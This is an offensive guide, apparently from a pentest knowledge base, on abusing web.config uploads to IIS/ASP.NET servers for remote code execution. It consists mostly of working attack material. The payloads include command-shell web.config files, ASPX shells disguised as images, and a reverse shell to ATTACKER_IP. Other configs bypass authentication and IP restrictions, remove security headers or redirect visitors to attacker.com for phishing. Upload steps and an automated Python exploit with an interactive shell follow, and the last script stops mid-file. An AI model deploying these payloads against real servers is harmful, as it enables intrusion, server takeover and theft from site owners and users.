---
title: Web.config Upload Abuse
description: Exploit file upload functionality by uploading malicious web.config files to IIS servers to achieve remote code execution, bypass restrictions, and hijack application behavior through ASP.NET configuration injection.
navigation:
  icon: i-lucide-file-cog
  title: Web.config Upload Abuse
---

## Understanding Web.config Upload Abuse

::badge
IIS Configuration Hijack
::

The `web.config` file is the core configuration file for ASP.NET applications running on Internet Information Services (IIS). When placed in any directory, IIS reads and applies its directives, inheriting and overriding settings from parent configurations. Uploading a crafted `web.config` to a writable directory grants the attacker control over how IIS handles requests within that directory, enabling remote code execution, handler remapping, MIME type abuse, and authentication bypass.

::note{icon="i-lucide-info"}
IIS processes `web.config` files **per-directory**. A `web.config` in `/uploads/` overrides the root configuration for everything under `/uploads/`. This means uploading a `web.config` to any directory where you can also place or reference files gives you control over execution within that scope.
::

::tabs
  :::tabs-item{icon="i-lucide-shield-alert" label="Why It's Dangerous"}
  | Capability | Impact |
  | --- | --- |
  | Register custom HTTP handlers | Execute arbitrary code on any file request |
  | Map new file extensions to ASP.NET | Make `.jpg`, `.txt`, `.log` files executable |
  | Enable `xsl` or `xslt` transforms | Execute C# code through XML transforms |
  | Modify authentication settings | Bypass authorization and access controls |
  | Set custom error pages | Redirect users, leak information |
  | Configure MIME types | Serve executable content as safe types |
  | Enable directory browsing | List directory contents |
  | Set HTTP response headers | Remove security headers, inject cookies |
  | Override compilation settings | Enable debug mode, change trust level |
  | Define connection strings | Redirect database connections |
  :::

  :::tabs-item{icon="i-lucide-target" label="Attack Surface"}
  - File upload endpoints that store files on IIS servers
  - CMS media upload directories (WordPress on IIS, Umbraco, DNN)
  - Image/document upload features on ASP.NET applications
  - SharePoint document libraries
  - WebDAV-enabled directories
  - FTP upload directories served by IIS
  - User avatar/profile picture uploads
  - File sharing platforms on Windows/IIS
  - Temporary file upload directories
  - Application plugin/theme upload features
  :::

  :::tabs-item{icon="i-lucide-list-checks" label="Prerequisites"}
  1. Target runs **IIS** with **ASP.NET** framework
  2. Upload functionality exists that stores files on the IIS server
  3. Attacker can upload a file named `web.config` (or the filter can be bypassed)
  4. The uploaded file lands in a directory served by IIS
  5. IIS has permission to read the uploaded `web.config`
  6. The `allowOverride` setting in the parent config is not fully locked down
  7. Attacker knows or can discover the upload directory path
  :::

  :::tabs-item{icon="i-lucide-lock-open" label="Configuration Inheritance"}
  ```
  Machine.config (global)
      └── Root web.config (framework level)
          └── Site web.config (application root)
              └── Subdirectory web.config ← ATTACKER UPLOADS HERE
                  (overrides parent settings for this directory)
  ```

  IIS applies the **most specific** configuration. A `web.config` in `/uploads/` takes precedence over the root `web.config` for all requests to `/uploads/*`. Only settings explicitly locked with `<location allowOverride="false">` cannot be overridden.
  :::
::

---

## Reconnaissance

::accordion
  :::accordion-item{icon="i-lucide-radar" label="Confirm IIS and ASP.NET"}
  ```bash
  # Server header fingerprinting
  curl -sI https://target.com | grep -iE "server|x-powered|x-aspnet"
  ```

  ```bash
  # Expected indicators:
  # Server: Microsoft-IIS/10.0
  # X-Powered-By: ASP.NET
  # X-AspNet-Version: 4.0.30319
  # X-AspNetMvc-Version: 5.2
  ```

  ```bash
  # Nmap service detection
  nmap -sV -p 80,443,8080,8443 target.com --script=http-server-header,http-headers
  ```

  ```bash
  # WhatWeb fingerprinting
  whatweb https://target.com -v
  ```

  ```bash
  # Check for common IIS files
  for path in iisstart.htm iisstart.png aspnet_client/ web.config trace.axd elmah.axd glimpse.axd; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${path}")
    echo "${path} -> HTTP ${status}"
  done
  ```

  ```bash
  # Check ASP.NET-specific endpoints
  for path in WebResource.axd ScriptResource.axd; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${path}")
    echo "${path} -> HTTP ${status}"
  done
  ```

  ```bash
  # Detect ASP.NET version from error pages
  curl -s "https://target.com/nonexistent.aspx" | grep -iE "version|asp\.net|runtime"
  ```
  :::

  :::accordion-item{icon="i-lucide-folder-search" label="Locate Upload Directories"}
  ```bash
  # Spider for upload forms
  gospider -s https://target.com -d 3 -c 10 | grep -iE "upload|file|attach|media|import"
  ```

  ```bash
  # Brute force common upload directories
  ffuf -u https://target.com/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -mc 200,301,302,403 | grep -iE "upload|file|media|image|content|asset|doc|attach"
  ```

  ```bash
  # IIS-specific directory enumeration
  ffuf -u https://target.com/FUZZ/ \
    -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt \
    -mc 200,301,302,403
  ```

  ```bash
  # Check for WebDAV
  curl -X OPTIONS https://target.com/ -v 2>&1 | grep -iE "allow:|dav:|ms-author"
  ```

  ```bash
  # Check WebDAV methods on upload directories
  for dir in uploads upload files media content; do
    echo "=== /${dir}/ ==="
    curl -sI -X OPTIONS "https://target.com/${dir}/" | grep -iE "allow:|dav:"
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-file-search" label="Test Existing web.config Access"}
  ```bash
  # Try to access web.config directly (usually blocked)
  curl -sI "https://target.com/web.config"
  curl -sI "https://target.com/uploads/web.config"
  curl -sI "https://target.com/Web.Config"
  curl -sI "https://target.com/WEB.CONFIG"
  ```

  ```bash
  # Try common paths
  for dir in "" uploads upload files media content images assets data documents App_Data; do
    path="${dir:+${dir}/}web.config"
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${path}")
    echo "${path} -> HTTP ${status}"
  done
  ```

  ```bash
  # IIS short name scanner — may reveal web.config existence
  java -jar iis_shortname_scanner.jar https://target.com/uploads/
  ```

  ```bash
  # Try alternate casing (IIS is case-insensitive)
  for name in web.config Web.config WEB.CONFIG Web.Config wEb.CoNfIg; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/uploads/${name}")
    echo "${name} -> HTTP ${status}"
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-check" label="Check Configuration Locking"}
  ```bash
  # Upload a minimal web.config to test if overrides are allowed
  cat > test_config.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <defaultDocument>
        <files>
          <clear />
          <add value="test.html" />
        </files>
      </defaultDocument>
    </system.webServer>
  </configuration>
  EOF

  curl -X POST https://target.com/upload \
    -F "file=@test_config.xml;filename=web.config" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # If upload succeeds, test if config is applied
  curl -sI "https://target.com/uploads/"
  # Look for redirect to test.html or changed behavior
  ```

  ```bash
  # Check for 500 error (config applied but has errors)
  curl -s "https://target.com/uploads/" | grep -iE "error|config|override|locked|section"
  # "Config section is locked" = allowOverride=false for that section
  # "500 Internal Server Error" = config is being read but has issues
  ```
  :::

  :::accordion-item{icon="i-lucide-scan" label="Detect Upload Filter Behavior"}
  ```bash
  # Test if web.config filename is blocked
  echo "test" > web.config
  curl -X POST https://target.com/upload \
    -F "file=@web.config" \
    -H "Cookie: session=YOUR_SESSION" \
    -s -o /dev/null -w "web.config -> HTTP %{http_code}\n"
  ```

  ```bash
  # Test casing variations
  for name in web.config Web.config WEB.CONFIG Web.Config web.Config; do
    curl -X POST https://target.com/upload \
      -F "file=@web.config;filename=${name}" \
      -s -o /dev/null -w "${name} -> HTTP %{http_code}\n"
  done
  ```

  ```bash
  # Test with different Content-Type headers
  for ct in "text/xml" "application/xml" "application/octet-stream" "text/plain" "image/jpeg"; do
    curl -X POST https://target.com/upload \
      -F "file=@web.config;type=${ct};filename=web.config" \
      -s -o /dev/null -w "Content-Type ${ct} -> HTTP %{http_code}\n"
  done
  ```
  :::
::

---

## Payload Construction

::callout{icon="i-lucide-alert-triangle"}
Each payload targets a different IIS/ASP.NET feature. Choose based on the target's framework version, locked sections, and available modules.
::

### Method 1 — ASP.NET Handler RCE via httpHandlers

::tip{icon="i-lucide-lightbulb"}
This technique registers a custom HTTP handler that executes inline C# code when any request matches the specified path pattern. Works on ASP.NET running in Classic mode.
::

::code-group
```xml [web.config — Classic Mode Handler]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.web>
    <httpHandlers>
      <add verb="*" path="*.config"
        type="System.Web.UI.PageHandlerFactory" />
    </httpHandlers>
  </system.web>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
        modules="IsapiModule"
        scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
        resourceType="Unspecified"
        requireAccess="Write"
        preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

```xml [web.config — Inline ASPX Code Execution]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.web>
    <httpHandlers>
      <add verb="*" path="*.config"
        type="System.Web.UI.PageHandlerFactory" />
    </httpHandlers>
    <compilation defaultLanguage="c#" debug="true" />
  </system.web>
</configuration>
<!--
<%@ Page Language="C#" %>
<%
  System.Diagnostics.Process p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + Request["cmd"];
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
  Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>
-->
```
::

### Method 2 — XSLT Transform RCE

::warning{icon="i-lucide-triangle-alert"}
This is the most reliable web.config RCE technique. It uses ASP.NET's built-in XSLT processing to execute C# code through `msxsl:script` blocks. No additional files need to be uploaded.
::

::code-group
```xml [web.config — XSLT RCE (Self-Contained)]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="new_policy" path="*.config" verb="GET"
        modules="IsapiModule"
        scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
        resourceType="Unspecified"
        requireAccess="Write"
        preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<!-- Reference: https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/ -->
```

```xml [web.config — Full XSLT Code Execution]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
        modules="IsapiModule"
        scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
        resourceType="Unspecified"
        requireAccess="Write"
        preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Xml" %>
<%@ Import Namespace="System.Xml.Xsl" %>
<%
string xsltPayload = @"<?xml version='1.0'?>
<xsl:stylesheet version='1.0'
  xmlns:xsl='http://www.w3.org/1999/XSL/Transform'
  xmlns:msxsl='urn:schemas-microsoft-com:xslt'
  xmlns:user='urn:my-scripts'>
  <msxsl:script language='C#' implements-prefix='user'>
    public string exec(string cmd) {
      System.Diagnostics.Process p = new System.Diagnostics.Process();
      p.StartInfo.FileName = ""cmd.exe"";
      p.StartInfo.Arguments = ""/c "" + cmd;
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.Start();
      return p.StandardOutput.ReadToEnd();
    }
  </msxsl:script>
  <xsl:template match='/'>
    <xsl:value-of select='user:exec(""COMMAND_HERE"")' />
  </xsl:template>
</xsl:stylesheet>";

XslCompiledTransform xslt = new XslCompiledTransform();
XsltSettings settings = new XsltSettings(true, true);
xslt.Load(XmlReader.Create(new System.IO.StringReader(xsltPayload)), settings, null);

System.IO.StringWriter sw = new System.IO.StringWriter();
xslt.Transform(XmlReader.Create(new System.IO.StringReader("<root/>")), null, sw);
Response.Write("<pre>" + sw.ToString() + "</pre>");
%>
```
::

### Method 3 — Handler Mapping for Arbitrary Extension Execution

::code-group
```xml [web.config — Execute JPG as ASPX]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="jpg_handler" path="*.jpg" verb="*"
        type="System.Web.UI.PageHandlerFactory"
        resourceType="Unspecified" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".jpg" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
  <system.web>
    <compilation defaultLanguage="c#" debug="true" />
    <httpHandlers>
      <add path="*.jpg" verb="*"
        type="System.Web.UI.PageHandlerFactory" />
    </httpHandlers>
  </system.web>
</configuration>
```

```xml [web.config — Execute TXT as ASPX]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="txt_handler" path="*.txt" verb="*"
        type="System.Web.UI.PageHandlerFactory"
        resourceType="Unspecified" />
    </handlers>
  </system.webServer>
  <system.web>
    <httpHandlers>
      <add path="*.txt" verb="*"
        type="System.Web.UI.PageHandlerFactory" />
    </httpHandlers>
  </system.web>
</configuration>
```

```xml [web.config — Execute PNG as ASPX]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="png_handler" path="*.png" verb="*"
        type="System.Web.UI.PageHandlerFactory"
        resourceType="Unspecified" />
    </handlers>
  </system.webServer>
  <system.web>
    <httpHandlers>
      <add path="*.png" verb="*"
        type="System.Web.UI.PageHandlerFactory" />
    </httpHandlers>
  </system.web>
</configuration>
```

```xml [web.config — Execute ANY Extension as ASPX]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="all_handler" path="*.*" verb="*"
        type="System.Web.UI.PageHandlerFactory"
        resourceType="Unspecified" />
    </handlers>
  </system.webServer>
  <system.web>
    <httpHandlers>
      <add path="*.*" verb="*"
        type="System.Web.UI.PageHandlerFactory" />
    </httpHandlers>
  </system.web>
</configuration>
```
::

### Method 4 — Inline ASPX Shell Payloads

::tip{icon="i-lucide-lightbulb"}
After uploading a `web.config` that maps image extensions to ASP.NET, upload a shell with an allowed extension. The handler mapping makes it executable.
::

::code-group
```aspx [cmd.jpg (ASPX shell disguised as JPG)]
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
if (Request["cmd"] != null) {
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + Request["cmd"];
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.RedirectStandardError = true;
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.CreateNoWindow = true;
  p.Start();
  string output = p.StandardOutput.ReadToEnd();
  string errors = p.StandardError.ReadToEnd();
  p.WaitForExit();
  Response.Write("<pre>Output:\n" + Server.HtmlEncode(output) + "\n\nErrors:\n" + Server.HtmlEncode(errors) + "</pre>");
}
%>
```

```aspx [reverse.txt (Reverse shell disguised as TXT)]
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Threading" %>
<%
string ip = Request["ip"] ?? "ATTACKER_IP";
int port = int.Parse(Request["port"] ?? "4444");
try {
  TcpClient client = new TcpClient(ip, port);
  Stream stream = client.GetStream();
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.RedirectStandardInput = true;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.RedirectStandardError = true;
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.CreateNoWindow = true;
  p.Start();
  StreamReader sr = new StreamReader(stream);
  StreamWriter sw = new StreamWriter(stream);
  new Thread(() => {
    string line;
    while ((line = p.StandardOutput.ReadLine()) != null) { sw.WriteLine(line); sw.Flush(); }
  }).Start();
  new Thread(() => {
    string line;
    while ((line = p.StandardError.ReadLine()) != null) { sw.WriteLine(line); sw.Flush(); }
  }).Start();
  string input;
  while ((input = sr.ReadLine()) != null) { p.StandardInput.WriteLine(input); p.StandardInput.Flush(); }
} catch (Exception ex) {
  Response.Write("Error: " + ex.Message);
}
%>
```

```aspx [upload.png (File upload shell disguised as PNG)]
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%
if (Request.Files.Count > 0) {
  var file = Request.Files[0];
  string savePath = Server.MapPath("~/uploads/") + file.FileName;
  file.SaveAs(savePath);
  Response.Write("Saved: " + savePath);
} else if (Request["path"] != null) {
  Response.Write("<pre>" + File.ReadAllText(Request["path"]) + "</pre>");
} else {
  Response.Write(@"<form method='POST' enctype='multipart/form-data'>
    <input type='file' name='f'/><input type='submit' value='Upload'/>
    </form><br/><form method='GET'>
    <input name='path' placeholder='C:\path\to\file'/><input type='submit' value='Read'/>
    </form>");
}
%>
```
::

### Method 5 — Application Initialization for Persistent RCE

::code-group
```xml [web.config — Application Initialization Backdoor]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <applicationInitialization doAppInitAfterRestart="true">
      <add initializationPage="/uploads/backdoor.aspx" />
    </applicationInitialization>
    <handlers>
      <add name="aspx_handler" path="*.aspx" verb="*"
        type="System.Web.UI.PageHandlerFactory"
        resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

```xml [web.config — Custom Module Injection]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <modules>
      <add name="BackdoorModule"
        type="System.Web.Handlers.TransferRequestHandler"
        preCondition="" />
    </modules>
  </system.webServer>
</configuration>
```
::

### Method 6 — Authentication/Authorization Bypass

::code-group
```xml [web.config — Disable Authentication]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.web>
    <authentication mode="None" />
    <authorization>
      <allow users="*" />
    </authorization>
  </system.web>
</configuration>
```

```xml [web.config — Allow Anonymous Access]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <security>
      <authentication>
        <anonymousAuthentication enabled="true" />
        <windowsAuthentication enabled="false" />
      </authentication>
    </security>
  </system.webServer>
  <system.web>
    <authorization>
      <allow users="*" />
      <allow users="?" />
    </authorization>
  </system.web>
</configuration>
```

```xml [web.config — Bypass IP Restrictions]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <security>
      <ipSecurity allowUnlisted="true">
        <clear />
      </ipSecurity>
    </security>
  </system.webServer>
</configuration>
```
::

### Method 7 — Directory Browsing & Information Disclosure

::code-group
```xml [web.config — Enable Directory Browsing]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <directoryBrowse enabled="true" showFlags="Date, Time, Size, Extension, LongDate" />
  </system.webServer>
</configuration>
```

```xml [web.config — Custom Error Page Redirect]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.web>
    <customErrors mode="Off" />
  </system.web>
  <system.webServer>
    <httpErrors errorMode="Detailed" />
  </system.webServer>
</configuration>
```

```xml [web.config — Enable Tracing]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.web>
    <trace enabled="true" localOnly="false" pageOutput="true" requestLimit="100" />
    <customErrors mode="Off" />
    <compilation debug="true" />
  </system.web>
</configuration>
```
::

### Method 8 — Header Injection & Security Downgrade

::code-group
```xml [web.config — Remove Security Headers]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="X-Frame-Options" />
        <remove name="X-Content-Type-Options" />
        <remove name="Content-Security-Policy" />
        <remove name="X-XSS-Protection" />
        <remove name="Strict-Transport-Security" />
        <add name="Access-Control-Allow-Origin" value="*" />
        <add name="Access-Control-Allow-Methods" value="GET,POST,PUT,DELETE,OPTIONS" />
        <add name="Access-Control-Allow-Headers" value="*" />
      </customHeaders>
    </httpProtocol>
  </system.webServer>
</configuration>
```

```xml [web.config — Inject Cookie via Header]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <add name="Set-Cookie" value="backdoor=true; Path=/; HttpOnly" />
      </customHeaders>
    </httpProtocol>
  </system.webServer>
</configuration>
```

```xml [web.config — URL Redirect for Phishing]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <httpRedirect enabled="true" destination="https://attacker.com/phish" httpResponseStatus="Found" />
  </system.webServer>
</configuration>
```
::

### Method 9 — MIME Type Manipulation

::code-group
```xml [web.config — Serve EXE as Download]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <staticContent>
      <remove fileExtension=".exe" />
      <mimeMap fileExtension=".exe" mimeType="application/octet-stream" />
      <remove fileExtension=".dll" />
      <mimeMap fileExtension=".dll" mimeType="application/octet-stream" />
      <remove fileExtension=".ps1" />
      <mimeMap fileExtension=".ps1" mimeType="text/plain" />
      <remove fileExtension=".bat" />
      <mimeMap fileExtension=".bat" mimeType="text/plain" />
    </staticContent>
  </system.webServer>
</configuration>
```

```xml [web.config — Serve SVG for XSS]
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <staticContent>
      <remove fileExtension=".svg" />
      <mimeMap fileExtension=".svg" mimeType="image/svg+xml" />
    </staticContent>
    <httpProtocol>
      <customHeaders>
        <remove name="X-Content-Type-Options" />
      </customHeaders>
    </httpProtocol>
  </system.webServer>
</configuration>
```
::

---

## Attack Execution

### Direct Upload

::tabs
  :::tabs-item{icon="i-lucide-upload" label="Upload web.config"}
  ```bash
  # Step 1: Create the malicious web.config
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.config" verb="*"
          modules="IsapiModule"
          scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
          resourceType="Unspecified"
          requireAccess="Write"
          preCondition="bitness64" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  <%@ Page Language="C#" Debug="true" %>
  <%
  if (Request["cmd"] != null) {
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
  }
  %>
  EOF
  ```

  ```bash
  # Step 2: Upload the web.config
  curl -X POST https://target.com/upload \
    -F "file=@web.config" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # Step 3: Trigger execution
  curl "https://target.com/uploads/web.config?cmd=whoami"
  curl "https://target.com/uploads/web.config?cmd=hostname"
  curl "https://target.com/uploads/web.config?cmd=ipconfig"
  ```
  :::

  :::tabs-item{icon="i-lucide-layers" label="Two-Stage: Handler + Shell"}
  ```bash
  # Stage 1: Upload web.config that maps .jpg to ASPX handler
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers>
        <add name="jpg_aspx" path="*.jpg" verb="*"
          type="System.Web.UI.PageHandlerFactory"
          resourceType="Unspecified" />
      </handlers>
    </system.webServer>
    <system.web>
      <compilation defaultLanguage="c#" debug="true" />
      <httpHandlers>
        <add path="*.jpg" verb="*"
          type="System.Web.UI.PageHandlerFactory" />
      </httpHandlers>
    </system.web>
  </configuration>
  EOF

  curl -X POST https://target.com/upload \
    -F "file=@web.config" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # Stage 2: Upload ASPX shell with .jpg extension
  cat > shell.jpg << 'SHELL'
  <%@ Page Language="C#" Debug="true" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%
  if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
  }
  %>
  SHELL

  curl -X POST https://target.com/upload \
    -F "file=@shell.jpg" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # Stage 3: Execute the shell via .jpg URL
  curl "https://target.com/uploads/shell.jpg?cmd=whoami"
  ```
  :::

  :::tabs-item{icon="i-lucide-globe" label="WebDAV Upload"}
  ```bash
  # Upload web.config via WebDAV PUT method
  curl -X PUT "https://target.com/uploads/web.config" \
    -H "Content-Type: text/xml" \
    -d @web.config \
    -v
  ```

  ```bash
  # Using cadaver (WebDAV client)
  cadaver https://target.com/uploads/
  # > put web.config
  # > put shell.jpg
  # > quit
  ```

  ```bash
  # Using davtest
  davtest -url https://target.com/uploads/ -uploadfile web.config -uploadloc web.config
  ```

  ```bash
  # Using rclone
  rclone copy web.config :webdav:uploads/ \
    --webdav-url https://target.com \
    --webdav-user anonymous \
    --webdav-pass ""
  ```
  :::
::

### Python Automated Exploitation

::code-group
```python [webconfig_rce.py]
import requests
import sys
import urllib3
urllib3.disable_warnings()

target = sys.argv[1].rstrip('/')
upload_path = sys.argv[2] if len(sys.argv) > 2 else '/upload'
upload_dir = sys.argv[3] if len(sys.argv) > 3 else '/uploads'
cookie = sys.argv[4] if len(sys.argv) > 4 else 'session=YOUR_SESSION'

upload_url = f"{target}{upload_path}"
headers = {"Cookie": cookie}

# Stage 1: Upload web.config
webconfig_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
        modules="IsapiModule"
        scriptProcessor="%windir%\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_isapi.dll"
        resourceType="Unspecified"
        requireAccess="Write"
        preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + Request["cmd"];
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.RedirectStandardError = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
  Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "\\n" + p.StandardError.ReadToEnd() + "</pre>");
}
%>'''

print(f"[*] Target: {upload_url}")
print(f"[*] Upload directory: {upload_dir}")

# Upload web.config
files = {"file": ("web.config", webconfig_payload, "text/xml")}
r = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=15)
print(f"[*] web.config upload: HTTP {r.status_code}")

if r.status_code in [200, 201]:
    # Test execution
    shell_url = f"{target}{upload_dir}/web.config"
    test = requests.get(f"{shell_url}?cmd=whoami", verify=False, timeout=10)
    
    if test.status_code == 200 and len(test.text.strip()) > 0 and "<pre>" in test.text:
        print(f"[+] RCE CONFIRMED!")
        print(f"[+] Shell URL: {shell_url}?cmd=COMMAND")
        print(f"[+] whoami output: {test.text.strip()}")
        
        # Interactive shell loop
        while True:
            cmd = input("\nshell> ").strip()
            if cmd.lower() in ['exit', 'quit']:
                break
            try:
                r = requests.get(f"{shell_url}?cmd={cmd}", verify=False, timeout=15)
                print(r.text)
            except Exception as e:
                print(f"Error: {e}")
    else:
        print(f"[-] Execution test failed: HTTP {test.status_code}")
        print(f"[-] Response: {test.text[:500]}")
else:
    print(f"[-] Upload failed: HTTP {r.status_code}")
    print(f"[-] Response: {r.text[:500]}")
```

```python [webconfig_handler_chain.py]
import requests
import sys
import urllib3
urllib3.disable_warnings()

target = sys.argv[1].rstrip('/')
upload_url = f"{target}/upload"
upload_dir = "/uploads"
cookie = sys.argv[2] if len(sys.argv) > 2 else "session=YOUR_SESSION"
headers = {"Cookie": cookie}

# Mapping configs for different extensions
handler_configs = {
    "jpg": '''<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="jpg_handler" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified"/>
    </handlers>
  </system.webServer>
  <system.web>
    <compilation defaultLanguage="c#" debug="true"/>
    <httpHandlers>
      <add path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"/>
    </httpHandlers>
  </system.web>
</configuration>''',

    "png": '''<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="png_handler" path="*.png" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified"/>
    </handlers>
  </system.webServer>
  <system.web>
    <compilation defaultLanguage="c#" debug="true"/>
    <httpHandlers>
      <add path="*.png" verb="*" type="System.Web.UI.PageHandlerFactory"/>
    </httpHandlers>
  </system.web>
</configuration>''',

    "txt": '''<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
